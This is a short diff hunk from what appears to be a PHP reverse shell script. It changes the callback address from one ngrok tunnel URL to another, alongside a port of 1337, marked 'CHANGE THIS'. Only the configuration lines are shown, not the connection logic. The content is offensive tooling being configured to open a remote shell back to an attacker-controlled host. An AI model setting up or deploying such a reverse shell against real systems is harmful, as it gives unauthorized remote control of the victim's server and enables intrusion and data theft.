@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = 'https://c9da49488b51.ngrok.io';  // CHANGE THIS
+$ip = 'http://2a680c90bfb2.ngrok.io';  // CHANGE THIS
 $port = 1337;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
